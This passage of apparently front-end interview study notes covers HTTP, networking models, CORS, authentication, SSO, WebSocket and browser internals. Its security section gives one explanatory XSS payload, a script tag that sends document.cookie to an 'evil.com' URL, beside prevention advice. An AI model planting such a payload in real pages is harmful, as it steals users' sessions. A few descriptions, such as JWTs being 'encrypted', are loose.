  Lists the encoding types the client can decode. Common encodings include gzip and deflate. A typical example is `Accept-Encoding: gzip, deflate`, suggesting that the client can handle these content encodings to reduce data size during transmission.

- **Accept-Language**  
  Specifies the preferred natural languages of the client, such as English or Spanish. This is useful for localizing content. For example, `Accept-Language: en-US` denotes that the client prefers American English.

### Connection Management

- **Connection**  
  Controls whether the network connection stays open or closes after the current transaction completes. Commonly used directives include `keep-alive` and `close`. For instance, `Connection: keep-alive` keeps the connection open for multiple requests.

- **Content-Length**  
  The size of the request or response body in octets (8-bit bytes). This is necessary for the server to know the amount of data being transferred. For example, `Content-Length: 348` indicates that the body of the request contains 348 bytes.

### Informational Headers

- **Cache-Control**  
  Provides directives for caching mechanisms in requests and responses. This can specify directives like `no-cache` or `max-age=3600`, which controls the caching behavior of the client and intermediate proxies.

- **Referer**  
  Indicates the URL of the previous web page from which a link to the currently requested page was followed. This header is often used for logging, optimization, and security purposes. For example, `Referer: http://www.example.com` helps the server understand the navigation flow of users.

## HTTP Status Codes
### 1xx: Informational
- **100 Continue**: Indicates that the initial part of a request has been received and the client should continue with the request.

### 2xx: Success
- **200 OK**: The request has succeeded. The information returned with the response depends on the method used in the request.
- **201 Created**: The request has been fulfilled and has resulted in one or more new resources being created.
- **204 No Content**: The server successfully processed the request, but is not returning any content.

### 3xx: Redirection
- **301 Moved Permanently**: This response code means that the URI of the requested resource has been changed permanently.
- **302 Found**: This response code means that the URI of the requested resource has been changed temporarily.
- **304 Not Modified**: Indicates that the resource has not been modified since the last request.

### 4xx: Client Error
- **400 Bad Request**: The server cannot or will not process the request due to an apparent client error.
- **401 Unauthorized**: Similar to 403 Forbidden, but specifically for use when authentication is required and has failed or has not yet been provided.
- **403 Forbidden**: The request was valid, but the server is refusing action.
- **404 Not Found**: The requested resource could not be found but may be available in the future.
- **429 Too Many Requests**: The user has sent too many requests in a given amount of time.

### 5xx: Server Error
- **500 Internal Server Error**: A generic error message, given when an unexpected condition was encountered and no more specific message is suitable.
- **502 Bad Gateway**: The server was acting as a gateway or proxy and received an invalid response from the upstream server.
- **503 Service Unavailable**: The server is currently unavailable (because it is overloaded or down for maintenance).
- **504 Gateway Timeout**: The server was acting as a gateway or proxy and did not receive a timely response from the upstream server.

## Tell the difference of Ajax, Fetch and Axios

Ajax, Fetch, and Axios are all tools for making HTTP requests in web applications, but they have distinct characteristics and uses.

Overall, Ajax represents a classical approach to asynchronous web requests, while Fetch and Axios are modern techniques, with Axios providing a richer feature set and more user-friendly API than the native Fetch API.

### Ajax (Asynchronous JavaScript and XML)

1. **What it is**: Ajax is a technique that combines several technologies, including HTML, CSS, JavaScript, the DOM, XML, XSLT, and particularly the XMLHttpRequest object. It enables web pages to update asynchronously by exchanging data with the server in the background. This allows for updating specific sections of a webpage without needing to reload the entire page. 

2. **Code Example**:
   ```javascript
   var xhttp = new XMLHttpRequest();
   xhttp.onreadystatechange = function() {
       if (this.readyState == 4 && this.status == 200) {
          document.getElementById("demo").innerHTML = this.responseText;
       }
   };
   xhttp.open("GET", "ajax_info.txt", true);
   xhttp.send();
   ```

### Fetch API

1. **What it is**: The Fetch API is a modern method for making web requests. It is part of the window object in modern browsers and provides a cleaner, promise-based approach to asynchronous requests, making it a more straightforward alternative to XMLHttpRequest.

2. **Code Example**:
   ```javascript
   fetch('https://api.example.com/data')
     .then(response => response.json())
     .then(data => console.log(data))
     .catch(error => console.error('Error:', error));
   ```

### Axios

1. **What it is**: Axios is a widely-used, promise-based HTTP client that works both in the browser and in node.js. It is a third-party library offering an enhanced and more intuitive API for making HTTP requests. It offers a simple yet extensible interface, capable of making XMLHttpRequests in the browser and HTTP requests in node.js. Axios supports the Promise API, can intercept requests and responses, transform data, cancel requests, and automatically handle JSON data. 

2. **Code Example**:
   ```javascript
   axios.get('https://api.example.com/data')
     .then(response => {
       console.log(response.data);
     })
     .catch(error => {
       console.error('Error:', error);
     });
   ```

## OSI Model Layers and Their Functions

### Physical Layer (Layer 1)
Handles the physical transmission of raw data over network devices such as cables, switches, and hubs. It defines the electrical, optical, and mechanical characteristics.

### Data Link Layer (Layer 2)
Responsible for node-to-node data transfer and error checking. Protocols like Ethernet and PPP operate here, and it's where MAC (Media Access Control) addresses are utilized.

### Network Layer (Layer 3)
Manages the routing of data across networks and handles packet forwarding, including routing through intermediate routers. IP (Internet Protocol) is a key protocol at this layer.

### Transport Layer (Layer 4)
Provides reliable, transparent transfer of data between end systems. This layer handles segmentation, acknowledgment, and error recovery. Protocols like TCP (Transmission Control Protocol) and UDP (User Datagram Protocol) operate here.

### Session Layer (Layer 5)
Manages sessions between applications, controlling and managing multiple connections, as well as establishing, managing, and terminating connections.

### Presentation Layer (Layer 6)
Transforms data to provide a standard interface for the application layer. Encryption, compression, and data translation are typical functions at this layer.

### Application Layer (Layer 7)
Closest to the user, providing network services to user applications. Protocols like HTTP, FTP, SMTP, and DNS operate at this layer.

## Comparison with the Internet Protocol Suite (TCP/IP)

The Internet Protocol Suite, commonly known as TCP/IP, is the foundational network protocol suite of the Internet and other computer networks. It has four layers which are sometimes mapped as follows in comparison to the seven-layer OSI Model:

### Link Layer
Corresponds to the OSI's Physical and Data Link Layers.

### Internet Layer
Directly maps to the OSI's Network Layer.

### Transport Layer
Identical to the OSI's Transport Layer.

### Application Layer
Encompasses the OSI's Session, Presentation, and Application Layers.

## Key Differences

- **Simplicity and Practicality**: TCP/IP is generally considered more straightforward and practical for real-world networking, while the OSI model is more of a theoretical model used for teaching and conceptual understanding.
- **Layer Functions**: The OSI model distinctly separates services, interfaces, and protocols into seven layers, whereas TCP/IP uses a more integrated approach with fewer layers.
- **Usage**: TCP/IP is widely used and forms the basis of today’s Internet, whereas the OSI model is not implemented as a protocol stack in its pure form but influences various network protocols and architectures.

## Describe TCP 3-way handshake and 4-way termination
### TCP 3-Way Handshake (Connection Establishment)
1. **SYN**: The client begins the handshake by sending a SYN (synchronize) packet to the server. This packet carries the client's initial sequence number, which is crucial for coordinating the subsequent data transfer.
2. **SYN-ACK**: In response, the server sends back a SYN-ACK (synchronize-acknowledge) packet. This packet acknowledges the client's SYN (hence the ACK) and also contains the server's initial sequence number, setting the stage for two-way communication.
3. **ACK**: The client completes the handshake by sending an ACK (acknowledge) packet to the server. This acknowledges the server's SYN-ACK packet, and with this, the connection is officially established, ready for data transfer.

### TCP 4-Way Termination (Connection Termination)
1. **FIN from Initiator**: The initiator (say, client A) of the termination sends a FIN (finish) packet to the other party (client B), signaling that it has no more data to send.
2. **ACK from Receiver**: Client B acknowledges the FIN from A by sending back an ACK (acknowledge) packet. At this point, A knows that B is aware of its intention to close the connection.
3. **FIN from Receiver**: After sending any remaining data, B sends its own FIN packet to A, indicating its readiness to close the connection.
4. **ACK from Initiator**: A responds with a final ACK packet acknowledging B's FIN. Post this, A can safely close the connection. B, upon receiving this ACK, will also close the connection. This ensures a clean and orderly termination of the connection from both ends.

## Understanding TCP Packet Sticking

TCP packet sticking refers to the phenomenon where multiple data packets transmitted from one source are interpreted as a single packet by the receiving end. This behavior stems from TCP’s stream-oriented nature, which views data as a continuous stream, not as discrete units. Grasping this concept is essential for front-end developers, especially those dealing with real-time data flows.

### Reasons Behind TCP Packet Sticking
TCP packet sticking is influenced by several factors that affect the handling and interpretation of data packets:

**Application and TCP Buffer Size Discrepancy**  
TCP might combine small, frequently sent data chunks into fewer packets to enhance transmission efficiency. This occurs particularly when the data written by the application is much smaller than the TCP buffer size.

**Receiver Processing Delays**  
Delays in processing at the receiver’s end can lead to the accumulation of packets in the TCP buffer, which may then be treated as a single larger packet. This is common when the receiver does not quickly read the incoming data.

**Network Conditions and Retransmission**  
Variations in network conditions, such as congestion or transmission delays, and TCP’s retransmission strategies for handling lost packets can cause packets to be grouped upon receipt.

### Mitigating TCP Packet Sticking
Several technical solutions can be implemented to prevent TCP packet sticking and ensure accurate data transmission:

**Delimiters**  
Using specific characters or sequences to mark the end of messages can delineate message boundaries. This method requires caution, as delimiters might inadvertently occur within the data, potentially leading to parsing errors.

**Length-Prefixed Data**  
A robust solution involves prefixing each data segment with its length, informing the receiver of the exact byte count of the message. This ensures messages are fully and correctly reconstructed, independent of packet reception sequence.

**Application-Level Framing**
Creating custom protocols at the application level to define the structure and handling of messages can significantly reduce packet sticking. This technique can incorporate both delimiter and length-based strategies to adapt to different data transmission conditions.

**Fixed-Length Messages**
Employing messages with a predetermined size can facilitate data processing, as the receiver always knows the size of expected data, minimizing the risk of packet merging.

## Difference between HTTP and UDP

HTTP (Hypertext Transfer Protocol) and UDP (User Datagram Protocol) operate at different layers of the network stack, with HTTP functioning at the application layer and UDP at the transport layer.

**HTTP**
- **Layer**: Application
- **Connection**: Connection-oriented
- **Reliability**: HTTP is built on TCP (Transmission Control Protocol), which ensures reliable transmission of data through error checking and retransmission of lost packets.
- **Use Cases**: Web browsing, form submission, data transfer in a reliable and ordered manner.
- **Characteristics**: HTTP requests and responses are structured in a predefined format, allowing for complex web interactions, including state management through cookies, authentication, and caching strategies.

**UDP**
- **Layer**: Transport
- **Connection**: Connectionless
- **Reliability**: Does not guarantee delivery, order, or error checking, making it less reliable but faster compared to TCP.
- **Use Cases**: Streaming media (video, audio), online gaming, voice over IP (VoIP) where speed is crucial and occasional data loss is acceptable.
- **Characteristics**: Suitable for applications that require fast, efficient transmission, such as live broadcasting or multiplayer online games.

**OSI Model Layers**
1. Application Layer
2. Presentation Layer
3. Session Layer
4. Transport Layer (TCP, UDP)
5. Network Layer
6. Data Link Layer
7. Physical Layer

**TCP/IP Model Layers**
1. Application Layer (HTTP, DNS, SMTP)
2. Transport Layer (TCP, UDP)
3. Internet Layer (IP)
4. Network Interface Layer

## Follow-up: Difference between HTTP 1.0, 1.1, 2.0 and 3.0
**HTTP 1.0**  
- **Features**: Supports basic methods like GET and POST.
- **Connection**: Each HTTP request results in a new TCP connection, increasing overhead and latency due to the need for multiple connections.

**HTTP 1.1**  
- **Features**:
  - Advanced caching mechanisms such as Cache-Control and ETag.
  - Persistent connections with `Connection: keep-alive` enabling multiple requests over a single connection.
  - Support for range requests and additional methods like PUT and DELETE to facilitate RESTful APIs.
- **Performance**:
  - Connection reuse significantly cuts down on latency.
  - Chunked transfer encoding supports dynamic content delivery without predefined content size.

**HTTP 2.0**  
- **Features**:
  - Header compression reduces overhead.
  - Multiplexing allows several requests and responses simultaneously over a single connection. Sprite images and inlining CSS are no longer necessary.
  - Server push improves web page load times by preemptively sending resources to the client.
- **Adoption**:
  - Its adoption has grown due to marked improvements in handling web traffic and resource delivery compared to HTTP/1.x.

**HTTP 3.0**  
- **Features**:
  - Built on QUIC (Quick UDP Internet Connections) instead of TCP.
  - Enhanced security through improved encryption methods.
  - Reduced latency by eliminating head-of-line blocking, a limitation in previous HTTP versions over TCP.
- **Adoption**:
  - Facilitates faster connection establishment and robust handling of connections even in adverse network conditions.

## What is CORS

Cross-Origin Resource Sharing (CORS) is a web browser security feature that allows controlled access to resources located outside of a given domain. It modifies the stricter same-origin policy, enabling safe cross-origin requests and data sharing between browsers and web servers.

### Understanding CORS and Same-Origin Policy

1. **Same-Origin Policy**: This security measure restricts scripts on one origin from interacting with resources on another origin unless they share the same protocol, domain, and port. It is crucial for preventing malicious sites from accessing sensitive data on another site.

2. **The Role of CORS**: CORS allows for the selective relaxation of the same-origin policy. Servers can specify "Access-Control-Allow-*" headers in responses to permit or deny requests based on origin, methods, and headers.

### Practical Implementation of CORS

- **Server-Side Configuration**: Implementing CORS requires adjusting the server's response headers. An example configuration is:
   ```javascript
   Access-Control-Allow-Origin: http://localhost:8011
   Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
   Access-Control-Allow-Headers: X-Requested-With, Content-Type
   Access-Control-Allow-Credentials: true
   ```
   This configuration details which origins, methods, and headers are allowed for cross-origin requests and whether credentials like cookies can be included.

### CORS Workarounds

#### JSONP Workaround for CORS

- **JSONP (JSON with Padding)**: A technique for circumventing the same-origin policy using script tags. JSONP allows data fetching from different domains but lacks the security and versatility of CORS.
   ```html
   <!-- Example of JSONP -->
   <script>
       window.onSuccess = function(data) {
           console.log(data);
       }
   </script>
   <script src="https://www.example.com/api/getData?callback=onSuccess"></script>
   ```
   JSONP must be supported by the server, which should return data with a callback function, enabling dynamic data retrieval without CORS restrictions.

#### PostMessage Workaround for CORS

- **PostMessage**: This method enables safe cross-origin communication between Window objects by allowing scripts to exchange messages across different origins. It is an HTML5 XMLHttpRequest Level 2 API, providing a secure alternative to JSONP for cross-origin data sharing.
   - Scenarios facilitated by postMessage include:
     1. Communication between a page and its newly opened window.
     2. Multi-tab communication.
     3. Interaction between a page and its embedded iframe.
     4. Cross-origin communication in the above scenarios.

#### Nginx as a Reverse Proxy

- **Nginx Configuration**: Nginx can function as a reverse proxy to facilitate CORS requests. By adding the necessary CORS headers to responses, Nginx serves as an intermediary, ensuring secure cross-origin communication.
   ```nginx
   server {
     listen 80;
     server_name example.com;
     location / {
       proxy_pass http://domain2.com:8080;  # domain2.com is the target server.
     }
   }
   ```

## Why Send OPTIONS Request When Using HTTP Cross-Origin

An OPTIONS request acts as a CORS preflight check, sent before the actual request to confirm that the server's CORS policy allows the intended cross-origin action.

### Importance of OPTIONS Requests in CORS

1. **Preflight Requests**: Browsers use an OPTIONS request to perform a preflight check for complex operations like PUT, DELETE, or those involving non-standard headers, ensuring they comply with the server's CORS settings.

2. **Security and Compliance**: These preflight checks help prevent unauthorized cross-origin requests, enhancing security and adherence to explicitly stated CORS policies by the server.

### Scenarios Requiring OPTIONS Requests

- **Complex Requests**: Requests using methods other than GET or POST, or employing custom headers, necessitate preflight checks.
- **Security-Sensitive Operations**: Operations that alter server data, such as updates or deletions, generally require a preflight to prevent CSRF attacks and ensure secure cross-origin interactions.

## User Authentication: Cookies vs. Tokens
### Cookies

Cookies are small data pieces sent from a website and stored on the user's device by their browser. They play a vital role in maintaining session state and personalizing user experience on the web.

- **Functionality**: Cookies are essential for managing user sessions. By attaching to every request, they help overcome HTTP's stateless nature, ensuring users remain logged in as they navigate a site.
- **Limitations**: Each cookie is limited to 4KB and must adhere to the Same-Origin Policy (SOP), which prevents sharing across different origins. Modern web practices favor LocalStorage and SessionStorage for data storage due to these limitations.
- **Security and Privacy**: In response to privacy concerns, modern browsers are restricting third-party cookies. Despite this, cookies are still widely used for authentication, in tandem with server-side sessions. To enhance security, the `HttpOnly` attribute can be set, preventing client-side script access and mitigating XSS attack risks.

**Authentication with Cookies and Sessions**

- Cookies contain identifiers (e.g., user ID), facilitating user authentication.
- Server-side sessions store user information linked to these identifiers, maintaining authenticated states across web requests.
- The authentication flow involves the server setting a cookie after successful credential verification, with subsequent requests using this cookie for secure and personalized interactions.

### Tokens

Tokens offer a customizable alternative to cookies, not bounded by HTTP standards. They are especially useful in scenarios requiring flexibility and cross-domain requests.

- **Storage and Management**: Unlike cookies, tokens need manual storage (e.g., in LocalStorage) and must be explicitly included in headers (e.g., `Authorization: Bearer <token>`).
- **Cross-Origin Resource Sharing (CORS)**: Tokens are not restricted by CORS, offering greater flexibility for cross-domain requests.
- **JWT (JSON Web Token)**: A prevalent type of token, JWTs are encrypted strings returned by the backend upon authentication. They contain all necessary user state information, enabling stateless authentication and facilitating scalability and performance in distributed systems.

**Advantages of JWT**

- **Cross-Domain Authentication**: JWTs operate independently of cookies, making them ideal for cross-domain scenarios.
- **Stateless Authentication**: With no need for server-side session storage, JWTs are perfect for distributed systems, enhancing scalability and reducing server load.
- **Self-Contained**: JWTs carry all necessary user information, allowing servers to verify requests with just the token, without database lookups.
- **Scalability and Performance**: The stateless nature of JWTs reduces the need for server resources, making them suitable for large-scale applications.

### Session vs. Token: Choosing the Right Approach

The choice between session and token-based authentication depends on application needs:

- **Session-Based Authentication** is preferred for applications requiring tight server control over user sessions and where server resource availability is not a constraint. It facilitates immediate user management actions.
- **Token-Based Authentication** shines in applications demanding scalability, reduced server load, and flexibility in cross-domain requests, minimizing CORS issues.

The decision should be guided by the application's architectural requirements, security needs, and anticipated user volume, balancing the trade-offs between control, scalability, and flexibility.

## Follow up: How to Achieve SSO (Single Sign-On)?

Single Sign-On (SSO) is an authentication process that allows a user to access multiple systems with one set of login credentials. This process involves three parties: the client side, the server side (System A), and a third-party SSO provider. The SSO flow typically follows these steps:

1. **Client Side Accesses System A**: The user tries to access System A.
2. **Authentication Failure**: System A checks for a valid certificate. Finding none, it informs the client that authentication has failed and login is required.
3. **Redirect to SSO Provider**: The client is redirected to the SSO provider because it lacks an SSO certificate.
4. **SSO Login Request**: The SSO provider requests the client to log in.
5. **Client Side Login**: The user logs in to the SSO provider.
6. **SSO Certificate and Token Issuance**: Upon successful login, the SSO provider issues a ticket (token) and an SSO certificate to the client.
7. **Certificate Storage on Client Side**: The client stores the SSO certificate.
8. **System A Validates Certificate**: The client attempts to access System A again, this time presenting the SSO certificate. System A contacts the SSO provider to validate the certificate.
9. **Certificate Validation by SSO Provider**: The SSO provider authenticates the certificate and validates the ticket.
10. **Valid Ticket Acknowledgment**: System A receives a message from the SSO provider that the ticket is valid and proceeds to process the client's request.
11. **Data Returned to Client Side**: System A returns the requested data to the client.

**Key Concepts Related to SSO:**

- **SSO Certificate**: A digital certificate that confirms the user's identity. It's used by the client to prove authentication without logging in again.
- **Token (Ticket)**: A unique piece of data issued by the SSO provider that represents the user's authentication state. It's used for validating the user's session without re-entering credentials.
- **Authentication Flow**: The process by which a user's identity is verified across multiple applications or systems using a single set of credentials managed by the SSO provider.

**Benefits of SSO:**

- **Enhanced User Experience**: Users need to log in only once to access multiple applications, simplifying their interaction with web services.
- **Improved Security**: Centralizes the management of user credentials and authentication processes, reducing the likelihood of password fatigue and the risks associated with managing multiple credentials.
- **Simplified Administration**: Eases the burden of password resets, account lockouts, and other administrative tasks related to user access across multiple systems.


## What is an HTTPS Man-in-the-Middle Attack? How Can It Be Prevented?

A Man-in-the-Middle (MitM) attack occurs when an attacker intercepts the communication between two parties, usually with the intent to secretly listen in or modify the messages being exchanged. In the context of HTTPS, this can be particularly damaging as HTTPS is designed to secure transmissions over the web, making any breach a serious concern.

### Symmetrical Encryption
Symmetrical encryption uses a single key for both encryption and decryption. This method is efficient and less resource-intensive, making it a cost-effective solution for many encryption needs.

### Asymmetrical Encryption
Asymmetrical encryption, on the other hand, involves two keys: a public key for encryption and a private key for decryption. This type of encryption is more secure but also more resource-intensive, leading to higher costs.

### HTTPS Encryption Process
- HTTP transmits data in plain text, making it vulnerable to interception and eavesdropping.
- HTTPS enhances security by encrypting the data transmitted between the client and the server. The encryption process involves:
  1. The client generates a random key and encrypts it with the server's public key, then sends this encrypted key to the server.
  2. The server decrypts the received key using its private key.
  3. Both parties use the random key for symmetric encryption, securing the subsequent communication.

The initial exchange of the random key uses asymmetrical encryption, ensuring that only the server can decrypt the key with its private key. The subsequent communication is secured through symmetrical encryption.

### Man-in-the-Middle Attack
During the asymmetrical encryption step, there's a risk that an attacker could intervene by presenting the client with the attacker's public key instead of the server's. This allows the attacker to decrypt, read, and potentially alter the communication by hijacking the session key.

### Prevention Measures
The primary defense against MitM attacks in the context of HTTPS is the use of certificates. Certificates are digital documents that verify the identity of the parties involved in the communication. They are issued by trusted third-party organizations known as Certificate Authorities (CAs). To prevent MitM attacks, it is crucial to:
- Ensure that the website's certificate is valid and issued by a reputable CA.
- The browser checks that the domain name in the certificate matches the website's domain.
- Use certificates from CAs that have established trust relationships with major browser vendors.

By adhering to these practices, both website owners and users can significantly reduce the risk of falling victim to MitM attacks, ensuring that their communications remain secure and private.

## Front-End Security Threats and Prevention Measures

### XSS (Cross-Site Scripting)
XSS attacks occur when an attacker injects malicious JavaScript code into a web application's output. The injected code executes within the victim's browser when they visit the compromised web page.

**Example:** An attacker could embed a script in a comment on a blog that sends the cookies of anyone viewing the comment to the attacker. This script might look something like `<script>fetch('http://evil.com/steal?cookie=' + document.cookie)</script>`.

**Prevention:** Ensure the encoding or escaping of user input on both the front-end and back-end. For example, convert `<` to `&lt;` and `>` to `&gt;`. Modern JavaScript frameworks like React automatically escape HTML to safeguard against XSS, significantly reducing the risk.

### CSRF (Cross-Site Request Forgery)
In CSRF attacks, attackers trick users into executing unwanted actions on a web application where they're authenticated, leveraging the user's identity.

**Example:** An attacker sends an email with a link to a malicious website. When the logged-in user clicks the link, the malicious site sends a request to a banking application to transfer money, exploiting the user's authenticated session.

**Prevention:** Employ anti-CSRF tokens and set the `SameSite` attribute for cookies to `strict` to prevent cross-site request forgery. Limiting CORS (Cross-Origin Resource Sharing) and utilizing authentication mechanisms also bolster security.

### Clickjacking
Clickjacking tricks users into clicking on something different from what the user perceives, often by embedding a page as a transparent iframe.

**Example:** An attacker places a transparent iframe over a button on a legitimate website. The user thinks they are clicking the legitimate button, but they are actually clicking a button within the iframe, potentially revealing sensitive information or agreeing to a malicious action.

**Prevention:** To prevent clickjacking, ensure that your website does not allow itself to be embedded in an iframe on another site by setting the `X-Frame-Options` header to `SAMEORIGIN`. Also, verify that `window.top.location.hostname` is the same as `window.location.hostname`; if not, redirect the user appropriately.

### DDoS (Distributed Denial of Service)
DDoS attacks flood a server with numerous requests to exhaust resources and bandwidth, rendering the service unavailable to legitimate users.

**Example:** A group of compromised computers (botnet) is used to flood an e-commerce site with so much traffic that legitimate customers cannot access the site during a major sale event.

**Prevention:** DDoS protection is challenging to implement at the software level alone; employing cloud-based DDoS protection services or Web Application Firewalls (WAF) can help mitigate these attacks.

### SQL Injection
SQL Injection attacks occur when an attacker is able to insert or "inject" a SQL query via the input data from the client to the application.

**Example:** An attacker inserts a SQL statement into a form field (e.g., login form) that is designed to log in users. This SQL statement is crafted to grant the attacker unauthorized access to the database, potentially allowing them to view sensitive information.

**Prevention:** Safeguard against SQL Injection by validating and sanitizing all user inputs. Utilize prepared statements and parameterized queries to ensure the database executes only the intended queries, not the injected malicious code.

### Best Practices for Prevention
Implementing robust security measures on both the front-end and back-end is crucial for protecting web applications against these attacks. This includes validating user inputs, employing security headers, and adhering to secure coding practices. Regular security audits and updates can also significantly reduce vulnerabilities.

## Websocket vs HTTP Protocol

### Websocket Protocol
- **Supports peer-to-peer communication**: Unlike HTTP, which is primarily designed for client-server communication, Websockets enable real-time, bi-directional communication between the client and server.
- **Protocol Name**: The Websocket protocol is indicated by `ws://` or `wss://` for secure Websockets, similar to how `http://` and `https://` indicate HTTP and HTTPS protocols.
- **Initiation**: A Websocket connection can be initiated by either the client or server side. This flexibility is particularly useful for applications that require real-time data exchange.
- **Use Cases**: It is widely used in applications requiring real-time interaction, such as message notifications, live discussion rooms, and collaborative editing platforms.
- **CORS Policy**: Websockets are not subject to the same-origin policy, which restricts how a document or script loaded from one origin can interact with resources from another origin. This means Websockets do not have CORS limitations.
- **Communication**: Communication over a Websocket is achieved through the `send` method for sending messages and the `onmessage` event handler for receiving messages. This contrasts with the request-response model used by HTTP.
- **Security**: A Websocket connection can be upgraded to a secure connection (`wss://`), analogous to upgrading HTTP to HTTPS, to ensure encrypted communication.

**Connection Steps**
1. The process begins with a standard HTTP request.
2. If successful, the connection is upgraded to a Websocket protocol for ongoing communication.

A Discussion Room Code Example:  
```js
// Node.js Side
const { WebSocketServer } = require('ws');
const wsServer = new WebSocketServer({ port: 3000 });
const list = new Set();

wsServer.on('connection', curWs => {
    console.info('Connected');
    list.add(curWs);
    // Implement cleanup mechanism here to remove inactive connections

    curWs.on('message', msg => {
        console.info('Received message:', msg.toString());
        // Broadcast to other clients
        list.forEach(ws => {
            if (ws === curWs) return;
            ws.send(msg.toString());
        });
    });
});
```
*Note: It's important to implement a cleanup mechanism to remove inactive connections to prevent memory leaks.*

```html
<!-- Client Side -->
<script>
    const ws = new WebSocket('ws://127.0.0.1:3000');
    ws.onopen = () => {
        console.info('Opened');
        ws.send('Client opened');
    };
    ws.onmessage = event => {
        console.info('Received message:', event.data);
    };

    const btnSend = document.getElementById('btn-send');
    btnSend.addEventListener('click', () => {
        console.info('Clicked');
        ws.send('Current time: ' + Date.now());
    });
</script>
```

In practice, for ease of use and additional features, developers often use libraries like Socket.IO. Socket.IO abstracts the complexities of Websockets and provides a cleaner API, such as `socket.emit()` for sending messages and `io.on()` for listening to events.

### Follow Up - Difference between WebSocket and HTTP: keep-alive

The main difference between WebSocket and HTTP with the `keep-alive` connection option lies in the nature of the communication and the initiation of requests.

**HTTP: keep-alive**
- **Connection Type**: HTTP is a stateless protocol. By default, each request/response pair is followed by closing the connection. However, with the `keep-alive` option, the connection between the client and server can be kept open, allowing multiple requests to be sent over the same connection without having to re-establish it each time.
- **Client-Initiated**: In an HTTP communication, even with `keep-alive`, the client initiates all requests. The server cannot send data to the client unless the client first sends a request. This means the server must wait for the client to request data before it can send any.
- **Server Response**: With `keep-alive`, the server holds the connection open for a specified time (or until a specified number of requests have been sent), allowing for faster subsequent requests by avoiding the overhead of establishing new connections. However, the server is essentially in a wait state, responding to client requests as they come in without the ability to initiate communication.
- **Timeouts and Retries**: If the server takes too long to respond, the client might face timeouts and may need to retry its request. This mechanism doesn't inherently solve issues related to real-time data exchange or server push capabilities.

**WebSocket**
- **Bi-Directional Communication**: WebSocket provides a full-duplex communication channel that operates over a single, long-lived connection. Once established, this connection allows either the client or the server to initiate messages, breaking away from the request-response model.
- **Server and Client Initiation**: Unlike HTTP, WebSocket allows the server to send data to the client at any time once the WebSocket connection is established. This makes it ideal for real-time applications where the server needs to push updates to the client without waiting for a request.
- **Real-Time Interaction**: WebSocket is designed for applications that require real-time data exchange, such as live chat, gaming, or financial trading applications, where the overhead of establishing new connections for each message (as in HTTP) would be prohibitive.
- **Efficiency and Performance**: WebSocket connections are more efficient for real-time communication because they eliminate the HTTP overhead after the initial handshake. This makes WebSocket a better choice for scenarios where performance and latency are critical.

## Difference between Prefetch and DNS-Prefetch

### `prefetch` and `preload`
- `preload` is a directive used to instruct the browser to load a resource early in the page's lifecycle, because it will be needed soon. This is crucial for resources that are critical to the current page's content, ensuring they are loaded with higher priority. The syntax is `<link rel="preload" href="example.js" as="script">` (or as="style" for CSS files), indicating that the resource is important for the immediate page load.
- `prefetch` is a hint to the browser that a resource might be needed in the future, but not on the current page. Resources prefetched are fetched and stored in the cache with low priority, during idle browser time, making them faster to load on subsequent page visits. The syntax is `<link rel="prefetch" href="example.js" as="script">`, suggesting the resource may be used in subsequent pages or actions.

### `dns-prefetch` and `preconnect`
- `dns-prefetch` is a way to resolve domain names (DNS lookups) before a user clicks on a link. This process reduces latency when the user navigates to the linked resource, as the DNS resolution step is already completed. The syntax for using it is `<link rel="dns-prefetch" href="//example.com">`. It's especially useful for third-party resources or any links that lead to different domains.
- `preconnect` goes a step further than DNS-prefetch by not only resolving the domain name but also performing the TCP handshake and, if the protocol is HTTPS, the TLS negotiation. This fully prepares the browser for a future connection, reducing the connection establishment time. The syntax is `<link rel="preconnect" href="//example.com">`. Preconnect is more comprehensive than DNS-prefetch because it completes all the preliminary network steps, making the resource ready to be used with minimal delay.

**Summary**
- Use **preload** for critical resources needed for the current page to ensure they are loaded quickly and with high priority.
- Use **prefetch** for resources that will be needed in subsequent page visits, to speed up their load time when the user navigates to those pages.
- Use **dns-prefetch** to resolve domain names ahead of time, reducing DNS lookup time for third-party resources or anticipated navigations.
- Use **preconnect** to fully prepare for a future connection, including DNS lookup, TCP handshake, and TLS negotiation, minimizing the latency for high-priority, cross-origin requests.

# 5. JS Engine: Browser and NodeJS.md

## Why 0.1 + 0.2 !== 0.3
This is a result of how computers handle binary floating-point arithmetic.

When you add these approximations, the tiny errors in their representation lead to results that are not exact, hence 0.1 + 0.2 results in something slightly different from 0.3. 

In practical terms, to compare floating-point numbers in such cases, a common approach is to check if they are close enough to each other, within a small tolerance, rather than expecting exact equality.

```javascript
const tolerance = 0.0001;
const sum = 0.1 + 0.2;
const target = 0.3;

if (Math.abs(sum - target) < tolerance) {
    console.log('Equal');
} else {
    console.log('Not Equal');
}
```

## Main Components of a Web Browser
The web browser is a complex application designed to enable internet browsing. Its main components are critical to its functionality and user experience.

### User Interface (UI)
**Description:** The user interface includes elements like the address bar, navigation buttons (back, forward), and bookmarking menu, which facilitate user interaction with the browser.

### Browser Engine
**Functionality:** The browser engine acts as a mediator between the UI and the rendering engine, managing inputs and outputs from the user interface to the display.

### Rendering Engine
**Role:** The rendering engine is crucial for displaying requested web content. It interprets HTML, CSS, and images from the web, rendering them as visual outputs on the screen.

### Networking
**Operations:** This component handles network operations such as HTTP requests. It is vital for fetching resources like HTML pages, images, and other files required for web content rendering.

### JavaScript Interpreter
**Purpose:** The JavaScript interpreter parses and executes JavaScript code, enabling dynamic interactions within web pages through scripting.

### UI Backend
**Utility:** Responsible for drawing basic widgets like combo boxes and windows, the UI backend serves as a bridge between the operating system and the graphical rendering.

### Data Storage
**Functionality:** Data storage mechanisms in browsers manage the storage of data such as cookies, cache, and local storage, playing a crucial role in data persistence and retrieval.

### Browser Plugins
**Examples:** Historically, plugins like Adobe Flash Player extended browser capabilities. However, modern browsers are moving away from plugins towards native HTML5 due to security and efficiency reasons.

## Front-End Storage Options

Understanding the different storage options available in front-end development is crucial for managing data efficiently and enhancing user experience. Each storage mechanism has its unique features, capacity, and use cases. Here, we'll explore three primary storage spaces: `LocalStorage`, `SessionStorage`, and `Cookies`, focusing on their characteristics, benefits, and practical applications.

### LocalStorage

LocalStorage provides a way to store data persistently on the client's browser. It's a key-value storage mechanism that allows data to remain saved across browser sessions and even after the browser is closed and reopened.

**Features:**

- **Persistent Storage:** Data remains until it's explicitly removed via script or by the user, making it reliable for long-term data storage.
- **Capacity:** Offers around 5MB of storage per domain, which is sufficient for most use cases without impacting performance.
- **Access:** Data is accessible synchronously, ensuring easy retrieval from the same domain without involving server requests.

**Uses:**

- Ideal for saving user preferences, themes, or other settings that enhance the user experience.
